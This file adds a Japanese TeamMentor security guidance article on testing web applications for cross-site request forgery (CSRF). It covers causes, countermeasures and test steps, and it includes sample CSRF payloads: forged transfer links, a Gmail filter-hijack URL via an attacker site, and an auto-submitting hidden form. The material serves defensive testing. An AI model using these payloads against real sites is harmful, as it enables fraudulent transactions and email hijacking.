@@ -1,0 +1,433 @@
+<?xml version="1.0" encoding="utf-8"?>
+<TeamMentor_Article Metadata_Hash="-353162122" Content_Hash="2080573553">
+  <Metadata>
+    <Id>5ef2adc6-defb-462f-bfdd-a7bf2ccdd82c</Id>
+    <Library_Id>92718d53-36b2-47bc-b6f5-e60994385f46</Library_Id>
+    <Title>クロスサイト リクエスト フォージェリ (CSRF) バグのテスト方法</Title>
+    <Category>セッション管理</Category>
+    <Phase>テスト</Phase>
+    <Technology>Web アプリケーション</Technology>
+    <Type>その方法</Type>
+    <DirectLink />
+    <Tag />
+    <Security_Demand />
+    <Author />
+    <Priority>Andres De Vivanco</Priority>
+    <Status />
+    <Source>SI</Source>
+  </Metadata>
+  <Content Sanitized="true" DataType="Html">
+    <Data><![CDATA[<h1>
+    <span>該当項目:</span>
+  </h1>
+  <ul>
+    <li>
+      <span>Java、C#、VB .Net、PHP、および Ruby などの言語で書かれた Web アプリケーション。</span>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>要約</span>
+  </h1>
+  <p>
+    <span>クロスサイト リクエスト フォージェリ (CSRF) (<i>XSRF</i> または <i>セッション ライディング</i> としても知られる) 攻撃中に、攻撃者は被害者が不正銀行取引のような予期されない Web リクエストを行うように強制します。<span>&nbsp;&nbsp; </span>たとえば、攻撃者が脆弱なページで、被害者が銀行機能を呼び出すように被害者クライアントを騙し、被害者から攻撃者の口座に送金します。<span> </span>被害者は攻撃者のリンク、または攻撃者のページに訪れることによって、攻撃をトリガーします。<span> </span>脆弱なサーバー ページは、被害者のリクエストの信頼性を再確認せずに、送金の続行を許可します。</span>
+  </p>
+  <p>
+    <span>以下の手順に従って、CSRF バグのテストを実行します。</span>
+  </p>
+  <ul>
+    <li>
+      <span>手順 1: <span> </span>攻撃シナリオを理解する</span>
+      <li>
+        <span>手順 2: <span> </span>原因と対策を分析する</span>
+        <li>
+          <span>手順 3: <span> </span>テストと調査を開始する</span>
+          <li>
+            <span>手順 4: <span> </span>テスト ケースを微調整する</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 1: <span> </span>攻撃シナリオを理解する</span>
+  </h1>
+  <p>
+    <span>CSRF バグのテストの最初の手順は、その攻撃シナリオを理解することです。<span>&nbsp; </span>CSRF 攻撃の構造は大抵一定でありますが、その目的は異なる場合があります。<span> </span>攻撃者は CSRF バグをエクスプロイトすることで、無許可の不正銀行取引を実行し、スプーフィングされた電子メール メッセージを送信して、機微な情報を盗み、バックドアをインストールすることできます。<span> </span>以下の手順では、CSRF 攻撃の構造を詳述します。</span>
+  </p>
+  <ol>
+    <li>
+      <span>攻撃者が Web アプリケーションで CSRF に対して脆弱な機能を発見します。</span>
+      <li>
+        <span>攻撃者は脆弱な関数を呼び出し、必要なパラメーターを渡すリンクを作成し、選択した攻撃を実行します。</span>
+        <li>
+          <span>攻撃者は被害者クライアントが脆弱な Web アプリケーションで認証するまで待ちます。</span>
+          <li>
+            <span>攻撃者は被害者クライアントが悪意のあるリンクを辿るように騙します。</span>
+            <li>
+              <span>被害者は偽造されたリクエストを脆弱なサーバーに送信します。</span>
+              <li>
+                <span>脆弱なサーバーは偽造されたリクエストを許可し、実行します。 </span>
+              </li>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>手順 2 で作成されたリンクの形式は、攻撃者が実行するペイロードに依存します。<span>&nbsp; </span>たとえば、ペイロードが被害者から攻撃者の口座に送金することである場合、リンクは以下のようになる可能性があります。</span>
+  </p>
+ <pre>
+    <strong>
+      <span>
+        <a>/makeTransfer?amount=1000&dest=attacker@attackersite.com'</a>
+      </span>
+    </strong>
+    <span>&nbsp;</span>
+  </pre>
+  <p>
+    <span>以下のリンクは、件名が</span>
+    <span>Hello</span>
+    <span> である電子メールを</span>
+    <span>johny@example.com</span>
+    <span>に送信します。</span>
+  </p>
+ <pre>
+    <strong>
+      <span>/sendMail?to=johny@example.com&title=Hello&body=I+did+not+send+this'</span>
+      <span>
+      </span>
+    </strong>
+  </pre>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>2007 の初めに、Google の Gmail で攻撃者がバックドアをインストールすることを可能にした深刻な欠陥が発見されました。それは攻撃者がすべての電子メールを自分に転送させるものでした。<span>&nbsp; </span>以下のリンクでは、攻撃者は被害者を攻撃者のサイトに進ませます。<span> </span>次に、攻撃者のサイトは偽造されたリクエストを被害者に代わって行います。</span>
+  </p>
+ <pre>
+    <span>
+      <strong>http://www.attakersite.org/util/csrf?method=POST&enctype=multipart/form-data&_action=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&cf2emc=true&cf2_email=attacker@attackersite.com&cf1_from&cf1_to&cf1_subj&cf1has&cf1hasnot&cf1attach=true&tfi&s=z&irf=on&nvpbucftb=Create%20Filter</strong>
+    </span>
+  </pre>
+  <p>
+    <span>HTTP POST リクエストを受信すると、Gmail はすべての被害者の電子メールを</span>
+    <span>attacker@attackersite.com</span>
+    <span>に転送します。</span>
+    <span>
+      <span>&nbsp; </span>さらに、攻撃者は今後の電子メールをハイジャッキングするためのバックドアとして機能するフィルタをインストールします。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 2: <span> </span>原因と対策を分析する</span>
+  </h1>
+  <p>
+    <span>この手順では、クロスサイト リクエスト フォージェリの原因、<span></span>およびそれをコード ベース内で認識する方法が示され、この問題を完全に避けるためにコーディングのベスト プラクティスが提示されます。</span>
+  </p>
+  <h2>
+    <span>
+      <em>クロスサイト リクエスト フォージェリの原因</em>
+    </span>
+  </h2>
+  <p>
+    <span>このような脆弱性は Web アプリケーションが偽造されたリクエストを信頼しているため存在します。<span>&nbsp; </span>つまり、このバグの原因は、不良か欠落している認証コードです。<span> </span>そのアプリケーションはすべてのクライアント リクエストが偽造されていないこと、およびそれが正当なクライアント アクションから実際に発生していることを検証する機能を欠落しています。<span>&nbsp; </span>CSRF に対して脆弱な Web アプリケーションは、<i>持続型</i> 認証システムを実装していて、それはセッション Cookie などの持続型トークンに対してユーザーを検証します。<span>&nbsp; </span>持続型認証では、サーバーがリクエストを受信する際、ユーザーがログインしているかどうかのみを確認し、リクエストの受信が正当なクライアント アクションによるものであるかは確認しません。</span>
+  </p>
+  <h2>
+    <span>
+      <em>クロスサイト リクエスト フォージェリ対策</em>
+    </span>
+  </h2>
+  <p>
+    <span>CSRF 脆弱性に対する主要な防止は、持続型認証システムの代わりに、<i>一時</i>認証システム [i] を提供することです。<span>&nbsp; </span>一時認証システムは、さらなるチェックの使用により、すべてのリクエストの信頼性を検証します。<span>&nbsp; </span>これを行う 1 つの方法は、すべての URL にある秘密を送信することです。 特に、アクションの作成、更新、削除、またはメールを要求する URL で秘密必要とします。<span> </span>攻撃者はその秘密を知らない限り、攻撃を実行できません。<span> </span>問題は、攻撃者が XSS 攻撃を実行してその秘密を盗み取ることができることです。</span>
+  </p>
+  <p>
+    <span>CSRF 攻撃に対するシルバー ブレットはありませんので、開発者は攻撃者に対して保護の水準を上げる方法を探す必要がります。<span>&nbsp;&nbsp; </span>インターネット ユーザーを CSRF から保護する一般的な方法は、アプリケーションがリクエストを許可する前に、ビットマップ画像のコンテンツを認証することを必要とする <i>CAPTCHA</i> (コンピュータと人間を区別する完全に自動化されたチューリングテスト) をクライアントに使用させることです。</span>
+  </p>
+  <p>
+    <span>他の推奨させる防止方法には、GET の代わりに POST を使用してアクションを実行、または HTTP 参照元のヘッダーを確認するなどの方法が含まれます。<span>&nbsp; </span>ただし、これらの両方の対策は、知識豊富な攻撃者によって攻略される可能性があります。それは悪意のあるスクリプトを使用して POST コマンドを簡単に偽造することができて、HTTP 参照元を簡単にスプーフィングすることもできるからです。<span> </span></span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 3: <span> </span>テストと調査を開始する</span>
+  </h1>
+  <p>
+    <span>CSRF 攻撃がどのように機能するかを学習した上で、この手順では CSRF バグのテストを開始するために実行する基本的なテスト ケースを示します。</span>
+  </p>
+  <p>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>クロスサイト リクエスト フォージェリの基本テスト</em>
+    </span>
+  </h2>
+  <p>
+    <span>以下の手順に従って、CSRF バグのテストに対するテストを実行します。 </span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>ユーザー リクエストに基づいたアクションを実行する Web アプリケーション ページを見つけます。</span>
+      <li>
+        <span>偽造されたリクエストをアプリケーション サーバーに送信するリンクまたはリダイレクトを含むページを構築します。<span>&nbsp; </span>このリンクには通常、</span>
+        <span>img</span>
+        <span> や</span>
+        <span>iframe などのタグが含まれ</span>
+        <span> (ほとんどのタグが使用可能ですが)、それらのソース アドレスはリクエストを指しています。</span>
+        <ul>
+          <li>
+            <span>
+ <pre>
+                <span>&lt;a href="http://bank.com/transfer.do?acct=MARIA&amount=100000"&gt;View my Pictures!&lt;/a&gt;</span>
+              </pre>
+ <pre>
+                <span>
+                </span>
+              </pre>
+ <pre>
+                <span>&lt;img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="1" height="1" border="0"&gt;</span>
+                <span>&nbsp;</span>
+              </pre>
+              <p>
+                <span>上記のリンクが両方とも GET リクエストを生成することに留意してください。<span>&nbsp; </span>POST リクエストのテストを実行するには、URL パラメーターが隠された入力として渡されるフォームを含むページを作成し、フォームを自動的に提出するためのスクリプトを追加する必要があります。</span>
+                <span>&nbsp;</span>
+              </p>
+ <pre>
+                <span>&lt;form action="http://bank.com/transfer.do" method="post"&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="acct" value="MARIA"&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name="ammount" value="100000"&gt;<br />&lt;/form&gt;<br />&lt;script&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.forms[0].submit();<br />&lt;/script&gt;<br /></span>
+              </pre>
+            </span>
+          </li>
+        </ul>
+        <span>
+          <li>
+            <span>インターネット ブラウザーを開いて、正当なユーザーとして Web アプリケーションにログインします。</span>
+            <li>
+              <span>手順 2 で作成されたページを開きます (必要に応じてリンクを辿ります)。</span>
+              <li>
+                <span>リクエストが成功したかどうかを確認してください。</span>
+                <li>
+                  <span>すべてのアプリケーションの作成/更新/削除/メール アクションに対し、テスト ケースを繰り返します。</span>
+                </li>
+              </li>
+            </li>
+          </li>
+        </span>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>予想される結果:&nbsp;<span> </span>アプリケーションが偽造されたリクエストを信頼して処理した場合、テストは失敗します。</span>
+  </p>
+  <h2>
+    <span>
+      <em>URL における秘密の使用のテスト</em>
+    </span>
+  </h2>
+  <p>
+    <span>このテストは、アプリケーションが URL において秘密を使用しているかを明らかにします。</span>
+  </p>
+  <p>
+    <span>テスト手順:</span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>正当なユーザーとしてアプリケーションにログインします。</span>
+      <li>
+        <span>有効なリクエストを生成し、URL で秘密を使用する Web フォームを参照します。<span> </span></span>
+        <span>
+          <span>
+            <ul>
+              <li>
+                <span>
+ <pre>
+                    <span>http://example.com/makeTransfer?amount=1000&dest=attacker@attackersite.com'&secret=2y9ryo2hr2<span></span></span>
+                  </pre>
+                </span>
+              </li>
+            </ul>
+            <li>
+              <span>HTTP(s) WebScarab <a style="mso-endnote-id: edn2" name="_ednref2" href="about:blank#_edn2" title=""><span><span><span><span>[ii]</span></span></span></span></a> プロキシを使用し、ネットワーク トラフィックの傍受を開始します。</span>
+              <li>
+                <span>WebScarab プロキシを使用するようにブラウザーを構成します。</span>
+                <li>
+                  <span>もう 1 回リクエストを行います。</span>
+                  <li>
+                    <span>WebScarab で、秘密を他の値に変更するために URL を変えます。</span>
+                    <ul>
+                      <li>
+ <pre>
+                          <span>
+                          </span>
+                        </pre>
+                      </li>
+                    </ul>
+                  </li>
+                </li>
+              </li>
+            </li>
+          </span>
+        </span>
+        <span>http://example.com/makeTransfer?amount=1000&dest=attacker@attackersite.com'&secret=<span></span><span><strong>XXXXXXXXXXX</strong></span></span>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>予想される結果:&nbsp;<span> </span>秘密が手順 6 で変更されたため、サーバーはアクションを拒否する必要があります。<span> </span>サーバーがリクエストされたアクションを許可した場合、テストは失敗します。</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>Cookie における秘密の使用のテスト</em>
+    </span>
+  </h2>
+  <p>
+    <span>このテストは、アプリケーションが Cookie において適切に秘密を使用しているかを明らかにします。</span>
+  </p>
+  <p>
+    <span>テスト手順:</span>
+    <b>
+      <i>
+        <span>
+        </span>
+      </i>
+    </b>
+  </p>
+  <ol>
+    <li>
+      <span>WebScarab プロキシを使用してネットワーク トラフィックの傍受を開始します。</span>
+      <li>
+        <span>ブラウザーを開いて、それが WebScarab プロキシを通るように構成し、正当なユーザーとしてアプリケーションにログインします。</span>
+        <li>
+          <span>リクエストを行い、Cookie を使用して秘密を提出するページを参照してください。</span>
+          <li>
+            <span>リクエストを提出します。</span>
+            <li>
+              <span>WebScarab で、Cookie の秘密を置換します。<span>&nbsp; </span>以下に例を挙げます。 </span>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <blockquote>
+ <pre>
+      <span>GET http://www.example.com/trasnfer?amount=1000&dest=1234 HTTP/1.1<br />Host: localhost<br />User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14<br />Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br />Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3<br />Accept-Encoding: gzip,deflate<br />Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br />Keep-Alive: 300<br />Proxy-Connection: keep-alive<br />Cookie: session-ID=1089eq14; secret=1240u9309u2efija<strong>XXXX</strong><br />&nbsp;</span>
+    </pre>
+  </blockquote>
+  <p>
+    <span>予想される結果:&nbsp;<span> </span>秘密が手順 6 で変更されたため、サーバーはアクションを拒否する必要があります。<span> </span>サーバーがリクエストされたアクションを許可した場合、テストは失敗します。</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 4: <span> </span>テスト ケース データを微調整する</span>
+  </h1>
+  <p>
+    <span>CSRF バグのテストを実行する最後の手順は、適切なテスト範囲を得るためにテスト ケース データを微調整することです。<span>&nbsp; </span><span>&nbsp;</span>CSRF バグのテストは、さまざまな攻撃シナリオの範囲を自動化された方法でカバーするためにテスト ケース データを微調整することを必要とします。</span>
+  </p>
+  <h2>
+    <span>
+      <em>目的ごとでのテスト ケース データの微調整</em>
+    </span>
+  </h2>
+  <p>
+    <span>攻撃者は CSRF バグを使用して、さまざまな種類の攻撃を実行できます。<span>&nbsp; </span>アプリケーションの特長に応じてこれらの異なるペイロードをテストすることは重要です。 CSRF 攻撃の<span></span>一般的な目的には、以下が含まれます。</span>
+  </p>
+  <ul>
+    <li>
+      <span>不正な銀行取引。</span>
+      <li>
+        <span>スプーフィングされた電子メールの送信。</span>
+        <li>
+          <span>管理アプリケーションのエクスプロイト。</span>
+          <li>
+            <span>パスワード リセットの強制。</span>
+            <li>
+              <span>ルーターとファイアウォールの較正の変更 [iii]。</span>
+            </li>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>テスト ケースの自動化</em>
+    </span>
+  </h2>
+  <p>
+    <span>最後に、テスト自動化に CSRF テスト ケースを追加することによって、それを拡張することが推奨されます。<span>&nbsp; </span>URL と POST リクエストにあるすべての GET リクエストのリストを作成し、異なるセッション トークンでリクエストを行う独自のスクリプトを書きます。<span> </span></span>
+  </p>
+  <h1>
+    <span>
+    </span>&nbsp;</h1>
+  <h1>
+    <span>結論</span>
+  </h1>
+  <p>
+    <span>クロスサイト リクエスト フォージェリは、それに対する明示的な保護のない Web アプリケーションに影響を与える深刻な攻撃クラスにあります。<span>&nbsp; </span>CSRF バグのテストを実行するには、攻撃のシナリオ、バグの原因、およびそれらに対する保護方法を理解する必要があります。<span>&nbsp; </span>さらに、異なる CSRF テストケースを実行し、異なるエントリ ポイントに応じてテスト ケース データを微調整する必要があります。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <p>[i] <span><b>クロスサイト リクエスト フォージェリ</b>.<span>&nbsp; </span>Wikipedia。 <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></span></p>
+  <div>
+    <div>
+      <p>
+        <a style="mso-endnote-id: edn2" name="_edn2" href="about:blank#_ednref2" title="">
+        </a>[ii] <span><b>セッション ライディング - <span> </span>現在の Web アプリケーションにおける幅広い脆弱性。 </b>Thomas Scheiber、SecureNet GmbH、2004 年 12 月。 <a href="http://www.securenet.de/papers/Session_Riding.pdf">http://www.securenet.de/papers/Session_Riding.pdf</a></span></p>
+    </div>
+    <div>
+      <p>
+        <span>&nbsp;</span>
+      </p>
+    </div>
+  </div>]]></Data>
+  </Content>
+</TeamMentor_Article>
